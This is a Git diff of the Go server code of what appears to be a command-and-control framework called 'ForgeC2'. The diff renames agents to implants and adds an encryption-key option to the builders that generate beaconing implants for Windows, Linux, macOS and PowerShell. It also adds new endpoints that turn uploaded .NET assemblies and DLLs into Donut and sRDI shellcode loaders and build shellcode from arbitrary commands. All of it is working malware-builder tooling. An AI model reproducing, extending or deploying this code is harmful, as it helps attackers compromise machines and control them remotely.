@@ -1,9 +1,8 @@
 package server
 
 import (
-	"bytes"
 	"fmt"
-	"html/template"
+	"io"
 	"log/slog"
 	"net/http"
 	"os"
@@ -57,13 +56,12 @@ func (s *Server) handleGeneratePage(c *gin.Context) {
 	data := gin.H{
 		"Title":          "ForgeC2 - Generate Agent",
 		"ActiveNav":      "generate",
-		"DefaultInt":     s.cfg.Agent.DefaultInterval,
-		"DefaultJitter":  s.cfg.Agent.DefaultJitter,
-		"DefaultUA":      s.cfg.Agent.DefaultUA,
-		"DefaultSkipTLS": s.cfg.Agent.DefaultSkipTLS,
+		"DefaultInt":     s.cfg.Implant.DefaultInterval,
+		"DefaultJitter":  s.cfg.Implant.DefaultJitter,
+		"DefaultUA":      s.cfg.Implant.DefaultUA,
+		"DefaultSkipTLS": s.cfg.Implant.DefaultSkipTLS,
 		"Listeners":      listeners,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
@@ -90,6 +88,7 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 		DNSDomain     string `form:"dns_domain"`
 		DNSServer     string `form:"dns_server"`
 		Proxy         string `form:"proxy"`
+		CryptoKey     string `form:"crypto_key"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -160,7 +159,7 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 		form.Protocol = "http"
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      form.Protocol,
 		Interval:      interval,
@@ -178,6 +177,7 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 		DNSDomain:     form.DNSDomain,
 		DNSServer:     form.DNSServer,
 		Proxy:         form.Proxy,
+		CryptoKey:     form.CryptoKey,
 	}
 
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
@@ -221,6 +221,7 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 		DNSDomain     string `form:"dns_domain"`
 		DNSServer     string `form:"dns_server"`
 		Proxy         string `form:"proxy"`
+		CryptoKey     string `form:"crypto_key"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -287,7 +288,7 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 		form.Protocol = "http"
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      form.Protocol,
 		Interval:      interval,
@@ -305,6 +306,7 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 		DNSDomain:     form.DNSDomain,
 		DNSServer:     form.DNSServer,
 		Proxy:         form.Proxy,
+		CryptoKey:     form.CryptoKey,
 	}
 
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
@@ -348,6 +350,7 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 		DNSDomain     string `form:"dns_domain"`
 		DNSServer     string `form:"dns_server"`
 		Proxy         string `form:"proxy"`
+		CryptoKey     string `form:"crypto_key"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -414,7 +417,7 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 		form.Protocol = "http"
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      form.Protocol,
 		Interval:      interval,
@@ -432,6 +435,7 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 		DNSDomain:     form.DNSDomain,
 		DNSServer:     form.DNSServer,
 		Proxy:         form.Proxy,
+		CryptoKey:     form.CryptoKey,
 	}
 
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
@@ -470,6 +474,7 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		Profile       string `form:"profile"`
 		ListenerID    uint   `form:"listener_id"`
 		Proxy         string `form:"proxy"`
+		CryptoKey     string `form:"crypto_key"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -506,7 +511,7 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		interval = form.BeaconTime
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      form.Protocol,
 		Interval:      interval,
@@ -561,6 +566,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		ListenerID    uint   `form:"listener_id"`
 		PayloadType   string `form:"payload_type"` // "exe", "ps1", "linux"
 		Proxy         string `form:"proxy"`
+		CryptoKey     string `form:"crypto_key"`
 		P2PMode       string `form:"p2p_mode"`
 		P2PParent     string `form:"p2p_parent"`
 		P2PListenAddr string `form:"p2p_listen_addr"`
@@ -638,7 +644,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		form.Protocol = "http"
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      form.Protocol,
 		Interval:      interval,
@@ -656,6 +662,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		DNSDomain:     form.DNSDomain,
 		DNSServer:     form.DNSServer,
 		Proxy:         form.Proxy,
+		CryptoKey:     form.CryptoKey,
 	}
 
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
@@ -914,7 +921,7 @@ func (s *Server) handleListenerDetail(c *gin.Context) {
 		return
 	}
 
-	var agents []db.Agent
+	var agents []db.Implant
 	s.db.Where("listener_id = ?", listener.ID).Order("last_seen desc").Find(&agents)
 
 	activeCount := 0
@@ -934,21 +941,11 @@ func (s *Server) handleListenerDetail(c *gin.Context) {
 		"TotalAgents":  len(agents),
 		"ActiveAgents": activeCount,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "listener_detail_content", data); err != nil {
-		slog.Error("Failed to render listener detail", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "listener_detail_content", data)
 }
 
 func (s *Server) handleCreateListener(c *gin.Context) {
@@ -1088,7 +1085,7 @@ func (s *Server) handleDeleteListener(c *gin.Context) {
 
 	// Check if any agents are using this listener
 	var agentCount int64
-	s.db.Model(&db.Agent{}).Where("listener_id = ?", id).Count(&agentCount)
+	s.db.Model(&db.Implant{}).Where("listener_id = ?", id).Count(&agentCount)
 	if agentCount > 0 {
 		c.JSON(http.StatusBadRequest, gin.H{
 			"error":       fmt.Sprintf("Cannot delete listener: %d agents still using this listener", agentCount),
@@ -1163,7 +1160,7 @@ func (s *Server) handleGenerateStager(c *gin.Context) {
 		interval = form.BeaconTime
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      "http",
 		Interval:      interval,
@@ -1275,7 +1272,7 @@ func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
 		interval = form.BeaconTime
 	}
 
-	cfg := payload.AgentConfig{
+	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
 		Protocol:      "http",
 		Interval:      interval,
@@ -1357,19 +1354,99 @@ func (s *Server) handleListenersPage(c *gin.Context) {
 		"TcpCount":     tcpC,
 		"DnsCount":     dnsC,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "listeners_content", data); err != nil {
-		slog.Error("Failed to render listeners content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
+	s.renderPage(c, "listeners_content", data)
+}
+
+func (s *Server) handleGenerateDonut(c *gin.Context) {
+	file, err := c.FormFile("assembly")
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "assembly file required"})
+		return
+	}
+	f, err := file.Open()
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+	defer f.Close()
+
+	data, err := io.ReadAll(f)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
 
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	cfg := payload.DonutConfig{
+		Assembly:   data,
+		ClassName:  c.PostForm("class"),
+		MethodName: c.PostForm("method"),
+		Args:       c.PostForm("args"),
+		Arch:       c.DefaultPostForm("arch", "amd64"),
+		Entropy:    3,
+	}
+
+	sc, err := payload.GenerateDonutShellcode(cfg)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+
+	outName := c.DefaultPostForm("filename", "loader.bin")
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
+	c.Data(http.StatusOK, "application/octet-stream", sc)
+}
+
+func (s *Server) handleGenerateSRDI(c *gin.Context) {
+	file, err := c.FormFile("dll")
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "DLL file required"})
+		return
+	}
+	f, err := file.Open()
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+	defer f.Close()
+
+	data, err := io.ReadAll(f)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+
+	exportName := c.DefaultPostForm("export", "")
+	arch := c.DefaultPostForm("arch", "amd64")
+
+	sc, err := payload.GenerateSRDIShellcode(data, exportName, arch == "amd64")
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+
+	outName := c.DefaultPostForm("filename", "rdi_loader.bin")
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
+	c.Data(http.StatusOK, "application/octet-stream", sc)
+}
+
+func (s *Server) handleGenerateShellcode(c *gin.Context) {
+	cmd := c.PostForm("command")
+	if cmd == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "command required"})
+		return
+	}
+
+	sc, err := payload.GenerateBasicShellcode(cmd)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+
+	outName := c.DefaultPostForm("filename", "shellcode.bin")
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
+	c.Data(http.StatusOK, "application/octet-stream", sc)
 }
